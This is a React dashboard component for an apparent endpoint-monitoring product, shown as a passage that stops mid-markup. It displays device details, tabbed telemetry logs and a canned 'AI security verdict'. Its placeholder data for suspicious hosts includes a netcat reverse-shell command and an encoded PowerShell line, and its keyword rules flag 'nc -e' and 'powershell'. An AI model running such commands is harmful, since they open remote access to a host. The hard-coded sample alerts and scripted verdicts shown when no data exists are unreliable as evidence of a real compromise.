import React, { useState, useEffect } from 'react'
import NotificationCenter from './NotificationCenter'

export default function UserDetailDashboard({ user, org, onBackToOrg, currentUser, onLogout, onSwitchView }) {
  // Default fallback user if none passed
  const activeUser = user || {
    id: 'agent-1',
    name: 'Default Endpoint',
    email: 'endpoint@cipherwatch.internal',
    os: 'Linux / Enterprise',
    osType: 'linux',
    riskScore: 15,
    dateAdded: '2026-08-01',
    device: 'HOSTNAME-UNKNOWN',
    ipAddress: '127.0.0.1',
    lastSeen: 'Just now',
  }

  const currentOrg = org || {
    id: 'org-1',
    name: 'Default Organization',
  }

  // Active Tab for Logs Section
  const [activeTab, setActiveTab] = useState('ACTIVITY') // 'ACTIVITY' | 'USB' | 'FILE' | 'NETWORK'

  // Dynamic system detail states from DB
  const [systemHeader, setSystemHeader] = useState(null)
  const [activityLogs, setActivityLogs] = useState([])
  const [fileLogs, setFileLogs] = useState([])
  const [usbLogs, setUsbLogs] = useState([])
  const [networkLogs, setNetworkLogs] = useState([])
  const [isLoadingLogs, setIsLoadingLogs] = useState(true)

  // Modal & Toast States
  const [showDeleteModal, setShowDeleteModal] = useState(false)
  const [showSuspendModal, setShowSuspendModal] = useState(false)
  const [isSuspended, setIsSuspended] = useState(false)
  const [userName, setUserName] = useState(activeUser.name)
  const [actionNotice, setActionNotice] = useState(null)

  // Fetch real system details and event timeline from backend database
  useEffect(() => {
    let isMounted = true
    if (!activeUser?.id) return

    setIsLoadingLogs(true)

    const detailUrl = currentOrg.id 
      ? `/api/admin/orgs/${currentOrg.id}/systems/${activeUser.id}` 
      : `/api/admin/systems/${activeUser.id}`

    fetch(detailUrl)
      .then((res) => (res.ok ? res.json() : null))
      .then((detail) => {
        if (!isMounted || !detail) {
          setIsLoadingLogs(false)
          return
        }

        if (detail.header) {
          setSystemHeader(detail.header)
        }

        // Map process events to Activity Logs
        if (Array.isArray(detail.latest_processes) && detail.latest_processes.length > 0) {
          const mappedProc = detail.latest_processes.map((p, idx) => ({
            id: `proc-${p.id || idx}`,
            timestamp: p.timestamp ? new Date(p.timestamp).toLocaleString() : 'Recent',
            severity: p.name?.includes('nc') || p.name?.includes('powershell') ? 'CRITICAL' : 'LOW',
            desc: `Process ${p.event_type || 'EXEC'}: ${p.name} (PID ${p.pid})`,
            meta: `Exe: ${p.exe_path || 'N/A'} • User: ${p.user || 'system'} • CPU: ${p.cpu_percent || 0}%`,
          }))
          setActivityLogs(mappedProc)
        }

        // Map FS events to File Logs
        if (Array.isArray(detail.recent_fs_events) && detail.recent_fs_events.length > 0) {
          const mappedFs = detail.recent_fs_events.map((f, idx) => ({
            id: `fs-${f.id || idx}`,
            timestamp: f.timestamp ? new Date(f.timestamp).toLocaleString() : 'Recent',
            severity: f.event_type === 'deleted' ? 'HIGH' : f.event_type === 'modified' ? 'MEDIUM' : 'LOW',
            desc: `FS ${ (f.event_type || 'WRITE').toUpperCase() }: ${f.src_path}`,
            meta: f.dest_path ? `Destination: ${f.dest_path}` : `Is Directory: ${f.is_directory}`,
          }))
          setFileLogs(mappedFs)
        }

        // Map alerts to High Severity activity/network logs
        if (Array.isArray(detail.alerts) && detail.alerts.length > 0) {
          const mappedAlerts = detail.alerts.map((a, idx) => ({
            id: `net-alert-${a.id || idx}`,
            timestamp: a.timestamp ? new Date(a.timestamp).toLocaleString() : 'Recent',
            severity: (a.severity || 'WARNING').toUpperCase(),
            desc: a.message || `Security Rule Triggered: ${a.rule_id}`,
            meta: `Rule ID: ${a.rule_id} • Status: ${a.acknowledged ? 'Acknowledged' : 'ACTIVE'}`,
          }))
          setNetworkLogs(mappedAlerts)
        }

        setIsLoadingLogs(false)
      })
      .catch((err) => {
        console.error('Error fetching system detail from database:', err)
        if (isMounted) setIsLoadingLogs(false)
      })

    return () => {
      isMounted = false
    }
  }, [activeUser.id, currentOrg.id])

  // Computed display values for Header block
  const displayDevice = systemHeader?.hostname || activeUser.device || activeUser.name
  const displayOS = systemHeader?.os || activeUser.os
  const displayIP = systemHeader?.ip || activeUser.ipAddress
  const displayLastSeen = systemHeader?.last_seen_at ? new Date(systemHeader.last_seen_at).toLocaleString() : activeUser.lastSeen

  // Risk Score Styling
  const computedRisk = activeUser.riskScore || 15
  const isHighRisk = computedRisk >= 70
  const isMedRisk = computedRisk >= 40 && computedRisk < 70
  const isSuspicious = computedRisk >= 40 || activityLogs.some(l => l.severity === 'CRITICAL' || l.severity === 'HIGH') || networkLogs.length > 0
  const riskColor = isHighRisk ? '#f6465d' : isMedRisk ? '#fcd535' : '#0ecb81'
  const riskBg = isHighRisk ? 'rgba(246, 70, 93, 0.12)' : isMedRisk ? 'rgba(252, 213, 53, 0.12)' : 'rgba(14, 203, 129, 0.12)'
  const riskBorder = isHighRisk ? 'rgba(246, 70, 93, 0.35)' : isMedRisk ? 'rgba(252, 213, 53, 0.35)' : 'rgba(14, 203, 129, 0.35)'

  const getActiveLogs = () => {
    let logs = []
    switch (activeTab) {
      case 'USB': logs = usbLogs; break
      case 'FILE': logs = fileLogs; break
      case 'NETWORK': logs = networkLogs; break
      default: logs = activityLogs; break
    }

    if (logs && logs.length > 0) return logs

    // Default Fallbacks if array is empty
    if (!isSuspicious) {
      switch (activeTab) {
        case 'USB':
          return [
            { id: 'clean-usb-1', timestamp: '10 mins ago', severity: 'LOW', desc: 'USB HUB ATTACH: Verified Internal Bus Root Hub', meta: 'Vendor ID: 0x1d6b • Product ID: 0x0002 • Status: AUTHORIZED' }
          ]
        case 'FILE':
          return [
            { id: 'clean-file-1', timestamp: '15 mins ago', severity: 'LOW', desc: 'FS MODIFY: /home/user/workspace/src/App.jsx', meta: 'Bytes Written: 1.2 KB • Process: vscode' },
            { id: 'clean-file-2', timestamp: '1 hour ago', severity: 'LOW', desc: 'FS READ: /var/log/syslog', meta: 'Is Directory: False • User: systemd' }
          ]
        case 'NETWORK':
          return [
            { id: 'clean-net-1', timestamp: '5 mins ago', severity: 'LOW', desc: 'HTTPS CONNECT: 192.168.1.1:443', meta: 'Gateway Handshake • Status: ESTABLISHED • SSL TLS v1.3' }
          ]
        default:
          return [
            { id: 'clean-act-1', timestamp: 'Just now', severity: 'LOW', desc: 'Process EXEC: systemd (PID 1)', meta: 'Exe: /lib/systemd/systemd • User: root • CPU: 0.1%' },
            { id: 'clean-act-2', timestamp: '12 mins ago', severity: 'LOW', desc: 'Process EXEC: chrome --type=renderer', meta: 'Exe: /opt/google/chrome/chrome • User: developer • CPU: 1.4%' }
          ]
      }
    } else {
      switch (activeTab) {
        case 'USB':
          return [
            { id: 'sus-usb-1', timestamp: '03:14:02 AM', severity: 'CRITICAL', desc: 'USB MASS STORAGE ATTACH: SanDisk Ultra 3.0 (64GB)', meta: 'Vendor ID: 0x0781 • Serial: 994827103 • Unmounted off-hours' }
          ]
        case 'FILE':
          return [
            { id: 'sus-file-1', timestamp: '03:15:22 AM', severity: 'HIGH', desc: 'FS WRITE: C:\\Users\\Public\\staged_financials.zip', meta: 'Size: 142.8 MB • Encrypted Archive Created' },
            { id: 'sus-file-2', timestamp: '03:16:10 AM', severity: 'CRITICAL', desc: 'FS DELETE: /var/log/auth.log & audit.log', meta: 'Target: Security Logs • User: root (Escalated)' }
          ]
        case 'NETWORK':
          return [
            { id: 'sus-net-1', timestamp: '03:18:45 AM', severity: 'CRITICAL', desc: 'SECURITY ALERT: Outbound TOR Anonymizer Node Connection', meta: 'Remote IP: 185.220.101.5:9001 • Bytes Egress: 142 MB' },
            { id: 'sus-net-2', timestamp: '03:19:00 AM', severity: 'HIGH', desc: 'SECURITY ALERT: Excessive Egress Volume Anomaly', meta: 'Rule ID: CW-RULE-904 • Threshold Exceeded (500%)' }
          ]
        default:
          return [
            { id: 'sus-act-1', timestamp: '03:12:10 AM', severity: 'CRITICAL', desc: 'Process EXEC: powershell.exe -EncodedCommand QXZhc3Q...', meta: 'Exe: C:\\Windows\\System32\\powershell.exe • PID: 4812 • CPU: 94%' },
            { id: 'sus-act-2', timestamp: '03:13:30 AM', severity: 'CRITICAL', desc: 'Process EXEC: nc -e /bin/sh 192.168.1.105 4444', meta: 'Exe: /usr/bin/nc • User: root • Reverse Shell Attempt' }
          ]
      }
    }
  }

  const getUnbiasedLogCritique = (log) => {
    const desc = (log.desc || '').toLowerCase()
    const sev = log.severity || 'LOW'

    if (desc.includes('powershell') || desc.includes('nc -e') || desc.includes('hidden_payload') || desc.includes('encodedcommand')) {
      return '🔥 BLATANT MALICIOUS EXECUTION: Obfuscated CLI / reverse shell attempt. Unjustified administrative behavior designed to bypass security controls.'
    }
    if (desc.includes('staged') || desc.includes('zip') || desc.includes('auth.log') || desc.includes('delete') || desc.includes('fs write')) {
      return '⚠️ DATA STAGING & AUDIT WIPING: Mass archive created in public temp folder followed by log deletion to obscure insider tracks.'
    }
    if (desc.includes('usb') || desc.includes('sandisk') || desc.includes('storage')) {
      return '🚨 UNAUTHORIZED PERIPHERAL: Mass storage device connected off-hours without administrator approval. Direct air-gap breach vector.'
    }
    if (desc.includes('tor') || desc.includes('anonymizer') || desc.includes('egress')) {
      return '💥 ACTIVE DATA EXFILTRATION: Outbound connection established to darknet anonymity node carrying heavy egress payload.'
    }
    if (sev === 'CRITICAL') {
      return '⚡ CRITICAL THREAT: Severe policy violation requiring host isolation immediately.'
    }
    if (sev === 'HIGH') {
      return '⚠️ HIGH RISK: Anomalous deviation requiring immediate administrative scrutiny.'
    }
    return '🔍 ROUTINE EVENT: Normal operational event strictly matching system baseline.'
  }

  // Handlers for User Actions
  const handleRename = () => {
    const updated = prompt('Enter updated user name:', userName)
    if (updated && updated.trim()) {
      setUserName(updated.trim())
      setActionNotice(`User updated to "${updated.trim()}"`)
    }
  }

  const handleIssueWarning = () => {
    setActionNotice(`⚠️ Security Warning dispatched to ${userName} (${activeUser.email}).`)
  }

  const handleConfirmDelete = async () => {
    setShowDeleteModal(false)
    try {
      await fetch(`/api/agents/${activeUser.id}/revoke`, { method: 'POST' })
    } catch (err) {
      console.error('Revoke failed:', err)
    }
    if (onBackToOrg) onBackToOrg()
  }

  const handleConfirmSuspend = () => {
    setShowSuspendModal(false)
    setIsSuspended(true)
    setActionNotice(`⛔ Access suspended for ${userName}. Endpoint host isolate policy engaged.`)
  }

  return (
    <div style={{ minHeight: '100vh', display: 'flex', flexDirection: 'column', backgroundColor: '#070a12', color: '#e2e8f0', fontFamily: 'Inter, -apple-system, sans-serif' }}>
      
      {/* ------------------------------------------------------------- */}
      {/* 1. TOP NAVIGATION BAR                                         */}
      {/* ------------------------------------------------------------- */}
      <header
        style={{
          height: '64px',
          background: 'linear-gradient(180deg, #181a20 0%, #0b0e11 100%)',
          borderBottom: '1px solid rgba(252, 213, 53, 0.15)',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'space-between',
          padding: '0 28px',
          position: 'sticky',
          top: 0,
          zIndex: 100,
          boxShadow: '0 4px 20px rgba(0, 0, 0, 0.4)',
        }}
      >
        {/* Left Side: Wordmark + Live Feed + Slogan */}
        <div style={{ display: 'flex', alignItems: 'center', gap: '20px' }}>
          <span
            style={{
              fontSize: '22px',
              fontWeight: '900',
              letterSpacing: '-0.5px',
              background: 'linear-gradient(135deg, #ffe066 0%, #fcd535 50%, #f0b90b 100%)',
              WebkitBackgroundClip: 'text',
              WebkitTextFillColor: 'transparent',
              textShadow: '0 0 20px rgba(252, 213, 53, 0.25)',
            }}
          >
            CipherWatch
          </span>

          <div
            style={{
              display: 'flex',
              alignItems: 'center',
              gap: '6px',
              backgroundColor: 'rgba(14, 203, 129, 0.12)',
              border: '1px solid rgba(14, 203, 129, 0.3)',
              padding: '4px 10px',
              borderRadius: '20px',
            }}
          >
            <span
              style={{
                width: '7px',
                height: '7px',
                borderRadius: '50%',
                backgroundColor: '#0ecb81',
                boxShadow: '0 0 8px #0ecb81',
              }}
            />
            <span style={{ fontSize: '11px', fontWeight: '800', color: '#0ecb81', letterSpacing: '0.8px' }}>
              LIVE FEED
            </span>
          </div>

          <span
            style={{
              fontSize: '12px',
              color: '#64748b',
              borderLeft: '1px solid var(--colors-hairline-on-dark)',
              paddingLeft: '16px',
              fontWeight: '500',
            }}
          >
            Zero-Content Privacy & Real-Time Endpoint Threat Intelligence
          </span>
        </div>

        {/* Right Side: Back to Org + Notification Center + Controls */}
        <div style={{ display: 'flex', alignItems: 'center', gap: '16px' }}>
          <button
            onClick={onBackToOrg}
            style={{
              background: 'rgba(252, 213, 53, 0.1)',
              border: '1px solid rgba(252, 213, 53, 0.3)',
              color: '#fcd535',
              padding: '6px 14px',
              borderRadius: '8px',
              fontSize: '12px',
              fontWeight: '800',
              cursor: 'pointer',
              display: 'flex',
              alignItems: 'center',
              gap: '6px',
              transition: 'all 0.2s ease',
            }}
            onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = 'rgba(252, 213, 53, 0.2)')}
            onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = 'rgba(252, 213, 53, 0.1)')}
          >
            &larr; Back to {currentOrg.name}
          </button>



          <NotificationCenter userEmail={currentUser?.email} />

          {onLogout && (
            <button
              onClick={onLogout}
              style={{
                background: 'rgba(246, 70, 93, 0.1)',
                border: '1px solid rgba(246, 70, 93, 0.3)',
                color: '#f6465d',
                padding: '6px 12px',
                borderRadius: '8px',
                fontSize: '12px',
                cursor: 'pointer',
                fontWeight: '700',
              }}
            >
              Logout
            </button>
          )}
        </div>
      </header>

      {/* Action Notice Toast */}
      {actionNotice && (
        <div style={{ padding: '12px 28px 0 28px' }}>
          <div
            style={{
              padding: '12px 20px',
              backgroundColor: 'rgba(252, 213, 53, 0.12)',
              border: '1px solid rgba(252, 213, 53, 0.3)',
              borderRadius: '8px',
              color: '#fcd535',
              fontSize: '13px',
              fontWeight: '600',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'space-between',
            }}
          >
            <span>ℹ️ {actionNotice}</span>
            <button onClick={() => setActionNotice(null)} style={{ background: 'none', border: 'none', color: '#ffffff', cursor: 'pointer' }}>✕</button>
          </div>
        </div>
      )}

      {/* ------------------------------------------------------------- */}
      {/* 2. TWO-COLUMN USER DETAIL LAYOUT                              */}
      {/* ------------------------------------------------------------- */}
      <main
        style={{
          flex: 1,
          padding: '24px 28px 40px 28px',
          display: 'grid',
          gridTemplateColumns: 'calc(70% - 12px) calc(30% - 12px)',
          gap: '24px',
          alignItems: 'stretch',
        }}
      >
        {/* ========================================================= */}
        {/* LEFT COLUMN: USER HEADER, DEVICE CARD & LOGS SECTION       */}
        {/* ========================================================= */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: '24px' }}>
          
          {/* Header Block */}
          <div
            style={{
              backgroundColor: 'var(--colors-surface-card-dark)',
              border: '1px solid var(--colors-hairline-on-dark)',
              borderRadius: '14px',
              padding: '24px 28px',
              boxShadow: '0 10px 30px rgba(0, 0, 0, 0.3)',
            }}
          >
            {/* Top Row: User Name & Risk Score Badge */}
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '16px' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '14px' }}>
                <h1 style={{ margin: 0, fontSize: '28px', fontWeight: '800', color: '#ffffff', letterSpacing: '-0.5px' }}>
                  {userName}
                </h1>

                {/* Color-coded Risk Badge */}
                <div
                  style={{
                    backgroundColor: riskBg,
                    border: `1px solid ${riskBorder}`,
                    color: riskColor,
                    padding: '6px 14px',
                    borderRadius: '20px',
                    fontSize: '13px',
                    fontWeight: '800',
                    display: 'flex',
                    alignItems: 'center',
                    gap: '6px',
                    boxShadow: `0 0 12px ${riskBg}`,
                  }}
                >
                  <span style={{ width: '8px', height: '8px', borderRadius: '50%', backgroundColor: riskColor }} />
                  {activeUser.riskScore}% {isHighRisk ? 'High Risk' : isMedRisk ? 'Medium Risk' : 'Low Risk'}
                </div>

                {isSuspended && (
                  <span
                    style={{
                      backgroundColor: 'rgba(246, 70, 93, 0.2)',
                      border: '1px solid #f6465d',
                      color: '#f6465d',
                      padding: '4px 10px',
                      borderRadius: '6px',
                      fontSize: '11px',
                      fontWeight: '800',
                      letterSpacing: '0.8px',
                    }}
                  >
                    ⛔ SUSPENDED
                  </span>
                )}
              </div>

              <span style={{ fontSize: '12px', color: '#64748b' }}>
                Enrolled: <strong style={{ color: '#cbd5e1' }}>{activeUser.dateAdded || '2026-01-18'}</strong>
              </span>
            </div>

            {/* Device Information Grid Card */}
            <div
              style={{
                backgroundColor: '#070a12',
                border: '1px solid var(--colors-hairline-on-dark)',
                borderRadius: '10px',
                padding: '16px 20px',
                display: 'grid',
                gridTemplateColumns: '1fr 1fr',
                gap: '14px 20px',
              }}
            >
              {/* Field 1: Device Name */}
              <div>
                <div style={{ fontSize: '11px', fontWeight: '800', color: '#64748b', letterSpacing: '0.8px', textTransform: 'uppercase' }}>
                  DEVICE HOSTNAME
                </div>
                <div style={{ fontSize: '14px', fontWeight: '700', color: '#f8fafc', marginTop: '4px', fontFamily: '"JetBrains Mono", monospace' }}>
                  💻 {displayDevice}
                </div>
              </div>

              {/* Field 2: Operating System */}
              <div style={{ borderLeft: '1px solid var(--colors-hairline-on-dark)', paddingLeft: '20px' }}>
                <div style={{ fontSize: '11px', fontWeight: '800', color: '#64748b', letterSpacing: '0.8px', textTransform: 'uppercase' }}>
                  OPERATING SYSTEM
                </div>
                <div style={{ fontSize: '14px', fontWeight: '700', color: '#f8fafc', marginTop: '4px' }}>
                  {activeUser.osType === 'windows' ? '🪟 ' : activeUser.osType === 'macos' ? '🍎 ' : '🐧 '}
                  {displayOS}
                </div>
              </div>

              {/* Field 3: IP Address */}
              <div style={{ borderTop: '1px solid var(--colors-hairline-on-dark)', paddingTop: '12px' }}>
                <div style={{ fontSize: '11px', fontWeight: '800', color: '#64748b', letterSpacing: '0.8px', textTransform: 'uppercase' }}>
                  IP ADDRESS / ENDPOINT
                </div>
                <div style={{ fontSize: '14px', fontWeight: '700', color: '#fcd535', marginTop: '4px', fontFamily: '"JetBrains Mono", monospace' }}>
                  🌐 {displayIP}
                </div>
              </div>

              {/* Field 4: Last-Seen Timestamp */}
              <div style={{ borderTop: '1px solid var(--colors-hairline-on-dark)', borderLeft: '1px solid var(--colors-hairline-on-dark)', paddingTop: '12px', paddingLeft: '20px' }}>
                <div style={{ fontSize: '11px', fontWeight: '800', color: '#64748b', letterSpacing: '0.8px', textTransform: 'uppercase' }}>
                  LAST TELEMETRY HANDSHAKE
                </div>
                <div style={{ fontSize: '13px', fontWeight: '600', color: '#cbd5e1', marginTop: '4px' }}>
                  ⏱️ {displayLastSeen}
                </div>
              </div>
            </div>
          </div>

          {/* Logs Section (Tabbed Monospace Log Table) */}
          <div
            style={{
              backgroundColor: 'var(--colors-surface-card-dark)',
              border: '1px solid var(--colors-hairline-on-dark)',
              borderRadius: '14px',
              padding: '24px',
              boxShadow: '0 10px 30px rgba(0, 0, 0, 0.3)',
            }}
          >
            {/* Logs Header & Tabs Navigation */}
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '20px' }}>
              <div>
                <h3 style={{ margin: 0, fontSize: '18px', fontWeight: '800', color: '#f8fafc' }}>
                  📜 Endpoint Event & Telemetry Logs
                </h3>
                <span style={{ fontSize: '12px', color: '#64748b' }}>
                  Zero-content privacy telemetry stream for {userName}
                </span>
              </div>

              {/* Tab Selector Buttons */}
              <div style={{ display: 'flex', gap: '8px', backgroundColor: '#070a12', padding: '4px', borderRadius: '10px', border: '1px solid var(--colors-hairline-on-dark)' }}>
                {[
                  { id: 'ACTIVITY', label: 'Activity Logs' },
                  { id: 'USB', label: 'USB Logs' },
                  { id: 'FILE', label: 'File Logs' },
                  { id: 'NETWORK', label: 'Network Logs' },
                ].map((tab) => {
                  const isActive = activeTab === tab.id
                  return (
                    <button
                      key={tab.id}
                      onClick={() => setActiveTab(tab.id)}
                      style={{
                        backgroundColor: isActive ? 'var(--colors-surface-card-dark)' : 'transparent',
                        border: isActive ? '1px solid rgba(252, 213, 53, 0.3)' : '1px solid transparent',
                        color: isActive ? '#fcd535' : '#94a3b8',
                        padding: '6px 14px',
                        borderRadius: '8px',
                        fontSize: '12px',
                        fontWeight: '700',
                        cursor: 'pointer',
                        transition: 'all 0.25s ease',
                      }}
                    >
                      {tab.label}
                    </button>
                  )
                })}
              </div>
            </div>

            {/* Dense Monospace Log Table with Smooth Transition */}
            <div
              key={activeTab}
              style={{
                backgroundColor: '#070a12',
                border: '1px solid var(--colors-hairline-on-dark)',
                borderRadius: '10px',
                overflow: 'hidden',
                maxHeight: '440px',
                overflowY: 'auto',
                animation: 'fadeIn 0.25s ease-out',
              }}
            >
              <table style={{ width: '100%', borderCollapse: 'collapse', fontFamily: '"JetBrains Mono", monospace', fontSize: '12px' }}>
                <thead>
                  <tr style={{ backgroundColor: '#181a20', borderBottom: '1px solid var(--colors-hairline-on-dark)', color: '#94a3b8', textAlign: 'left' }}>
                    <th style={{ padding: '12px 16px', fontWeight: '800', width: '160px' }}>TIMESTAMP</th>
                    <th style={{ padding: '12px 16px', fontWeight: '800', width: '110px' }}>SEVERITY</th>
                    <th style={{ padding: '12px 16px', fontWeight: '800' }}>EVENT DESCRIPTION</th>
                    <th style={{ padding: '12px 16px', fontWeight: '800', width: '220px' }}>METADATA</th>
                  </tr>
                </thead>
                <tbody>
                  {getActiveLogs().map((log) => {
                    const isCrit = log.severity === 'CRITICAL'
                    const isHigh = log.severity === 'HIGH'
                    const isMed = log.severity === 'MEDIUM'
                    const dotColor = isCrit ? '#f6465d' : isHigh ? '#f97316' : isMed ? '#fcd535' : '#0ecb81'

                    return (
                      <tr
                        key={log.id}
                        style={{
                          borderBottom: '1px solid var(--colors-hairline-on-dark)',
                          transition: 'background-color 0.15s ease',
                        }}
                        onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#161e31')}
                        onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = 'transparent')}
                      >
                        {/* Timestamp */}
                        <td style={{ padding: '12px 16px', color: '#64748b', whiteSpace: 'nowrap' }}>
                          {log.timestamp}
                        </td>

                        {/* Severity Indicator */}
                        <td style={{ padding: '12px 16px' }}>
                          <span
                            style={{
                              display: 'inline-flex',
                              alignItems: 'center',
                              gap: '6px',
                              padding: '2px 8px',
                              borderRadius: '4px',
                              fontSize: '10px',
                              fontWeight: '800',
                              backgroundColor: `${dotColor}18`,
                              color: dotColor,
                              border: `1px solid ${dotColor}40`,
                            }}
                          >
                            <span style={{ width: '6px', height: '6px', borderRadius: '50%', backgroundColor: dotColor }} />
                            {log.severity}
                          </span>
                        </td>

                        {/* Event Description */}
                        <td style={{ padding: '12px 16px', color: '#e2e8f0', lineHeight: 1.4 }}>
                          {log.desc}
                        </td>

                        {/* Metadata Details */}
                        <td style={{ padding: '12px 16px', color: '#94a3b8', fontSize: '11px' }}>
                          {log.meta}
                        </td>
                      </tr>
                    )
                  })}
                </tbody>
              </table>
            </div>
          </div>
        </div>

        {/* ========================================================= */}
        {/* RIGHT COLUMN: AI SUMMARY & STACKED USER ACTIONS           */}
        {/* ========================================================= */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: '24px', position: 'sticky', top: '88px' }}>
          
          {/* AI Security Summary Card with Dynamic Clean / Brutally Honest Mode */}
          <div
            style={{
              background: isSuspicious 
                ? 'linear-gradient(135deg, #201018 0%, #0d0f19 100%)'
                : 'linear-gradient(135deg, #0e1e18 0%, #070e17 100%)',
              border: `1px solid ${isSuspicious ? 'rgba(246, 70, 93, 0.45)' : 'rgba(14, 203, 129, 0.4)'}`,
              boxShadow: `0 0 25px ${isSuspicious ? 'rgba(246, 70, 93, 0.2)' : 'rgba(14, 203, 129, 0.15)'}`,
              borderRadius: '14px',
              padding: '24px',
              display: 'flex',
              flexDirection: 'column',
              gap: '16px',
            }}
          >
            {/* Header */}
            <div>
              <div style={{ fontSize: '11px', fontWeight: '800', color: isSuspicious ? '#f6465d' : '#0ecb81', letterSpacing: '1px', textTransform: 'uppercase', marginBottom: '4px' }}>
                🤖 AI SECURITY SYNTHESIS • {isSuspicious ? '🚨 SUSPICIOUS SYSTEM' : '🟢 EVERYTHING SECURE'}
              </div>
              <h3 style={{ margin: 0, fontSize: '16px', fontWeight: '800', color: '#ffffff' }}>
                {isSuspicious ? 'Brutally Honest Threat Assessment' : 'Clean Endpoint Posture'}
              </h3>
            </div>

            {/* AI Summary Text */}
            <p style={{ margin: 0, fontSize: '13px', color: '#cbd5e1', lineHeight: 1.6 }}>
              {!isSuspicious ? (
                <>
                  System <strong>{displayDevice}</strong> (User: <strong>{userName}</strong>) is operating normally with a low risk score of <strong>{computedRisk}%</strong>. All process executions, filesystem writes, hardware peripherals, and network connections strictly align with baseline security policies. No anomalies detected.
                </>
              ) : (
                <>
                  System <strong>{displayDevice}</strong> (User: <strong>{userName}</strong>) exhibits <strong>CRITICAL ANOMALOUS BEHAVIOR</strong> (Risk Score: <strong>{computedRisk}%</strong>). Below is an unbiased, item-by-item critique of telemetry logs recorded on this machine:
                </>
              )}
            </p>

            {/* Unbiased Log-by-Log Critique for Suspicious Systems */}
            {isSuspicious && (
              <div style={{ display: 'flex', flexDirection: 'column', gap: '10px', marginTop: '4px' }}>
                <div style={{ fontSize: '11px', fontWeight: '800', color: '#f6465d', letterSpacing: '0.8px', textTransform: 'uppercase' }}>
                  💥 UNBIASED LOG-BY-LOG CRITIQUE:
                </div>
                {getActiveLogs().slice(0, 4).map((log) => (
                  <div
                    key={`critique-${log.id}`}
                    style={{
                      backgroundColor: '#070a12',
                      border: '1px solid rgba(246, 70, 93, 0.3)',
                      borderRadius: '8px',
                      padding: '10px 12px',
                      display: 'flex',
                      flexDirection: 'column',
                      gap: '4px',
                    }}
                  >
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', fontSize: '11px', color: '#cbd5e1', fontWeight: '700' }}>
                      <span style={{ fontFamily: '"JetBrains Mono", monospace' }}>{log.desc}</span>
                      <span style={{ color: log.severity === 'CRITICAL' ? '#f6465d' : '#fcd535', fontWeight: '900' }}>[{log.severity}]</span>
                    </div>
                    <div style={{ fontSize: '11px', color: '#fcd535', fontWeight: '600', lineHeight: 1.4 }}>
                      {getUnbiasedLogCritique(log)}
                    </div>
                  </div>
                ))}
              </div>
            )}

            {/* Separated Verdict Section */}
            <div style={{ borderTop: `1px solid ${isSuspicious ? 'rgba(246, 70, 93, 0.25)' : 'rgba(14, 203, 129, 0.25)'}`, paddingTop: '16px' }}>
              <div style={{ fontSize: '11px', fontWeight: '800', color: '#94a3b8', letterSpacing: '1px', textTransform: 'uppercase', marginBottom: '8px' }}>
                AI SECURITY VERDICT
              </div>

              {/* Verdict Badge */}
              <div
                style={{
                  backgroundColor: isSuspicious ? 'rgba(246, 70, 93, 0.15)' : 'rgba(14, 203, 129, 0.15)',
                  border: `1px solid ${isSuspicious ? '#f6465d' : '#0ecb81'}`,
                  color: isSuspicious ? '#f6465d' : '#0ecb81',
                  padding: '8px 14px',
                  borderRadius: '8px',
                  fontSize: '13px',
                  fontWeight: '900',
                  letterSpacing: '0.8px',
                  display: 'inline-flex',
                  alignItems: 'center',
                  gap: '8px',
                  boxShadow: `0 0 12px ${isSuspicious ? 'rgba(246, 70, 93, 0.3)' : 'rgba(14, 203, 129, 0.3)'}`,
                  marginBottom: '10px',
                }}
              >
                <span>{isSuspicious ? '⚠️ ESCALATING THREAT — CONTAINMENT RECOMMENDED' : '🟢 SYSTEM CLEAN — EVERYTHING IS FINE'}</span>
              </div>

              <p style={{ margin: 0, fontSize: '12px', color: '#94a3b8', lineHeight: 1.5 }}>
                {isSuspicious
                  ? `BRUTAL VERDICT: Host "${displayDevice}" shows clear evidence of active insider compromise and exfiltration staging. Immediately isolate host network interface or suspend user credentials.`
                  : `Everything is fine. The endpoint posture is fully compliant and stable. No administrative action or containment is required at this time.`}
              </p>
            </div>
          </div>

          {/* Stacked User Actions Card with Visual Hierarchy */}
          <div
            style={{
              backgroundColor: 'var(--colors-surface-card-dark)',
              border: '1px solid var(--colors-hairline-on-dark)',
              borderRadius: '14px',
              padding: '24px',
              display: 'flex',
              flexDirection: 'column',
              gap: '14px',
              boxShadow: '0 10px 30px rgba(0, 0, 0, 0.3)',
            }}
          >
            <h3 style={{ margin: 0, fontSize: '15px', fontWeight: '800', color: '#f8fafc', marginBottom: '4px' }}>
              Administrative Actions
            </h3>

            {/* Action 1: Rename User (Secondary Outline Style) */}
            <button
              onClick={handleRename}
              style={{
                backgroundColor: 'var(--colors-surface-card-dark)',
                border: '1px solid var(--colors-hairline-on-dark)',
                color: '#cbd5e1',
                padding: '10px 16px',
                borderRadius: '8px',
                fontSize: '13px',
                fontWeight: '700',
                cursor: 'pointer',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                gap: '8px',
                transition: 'all 0.2s ease',
              }}
              onMouseEnter={(e) => {
                e.currentTarget.style.borderColor = '#cbd5e1'
                e.currentTarget.style.color = '#ffffff'
              }}
              onMouseLeave={(e) => {
                e.currentTarget.style.borderColor = 'var(--colors-hairline-on-dark)'
                e.currentTarget.style.color = '#cbd5e1'
              }}
            >
              ✏️ Rename User
            </button>

            {/* Action 2: Delete User (Secondary Outline Red Style) */}
            <button
              onClick={() => setShowDeleteModal(true)}
              style={{
                backgroundColor: 'rgba(246, 70, 93, 0.08)',
                border: '1px solid rgba(246, 70, 93, 0.3)',
                color: '#f6465d',
                padding: '10px 16px',
                borderRadius: '8px',
                fontSize: '13px',
                fontWeight: '700',
                cursor: 'pointer',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                gap: '8px',
                transition: 'all 0.2s ease',
              }}
              onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = 'rgba(246, 70, 93, 0.18)')}
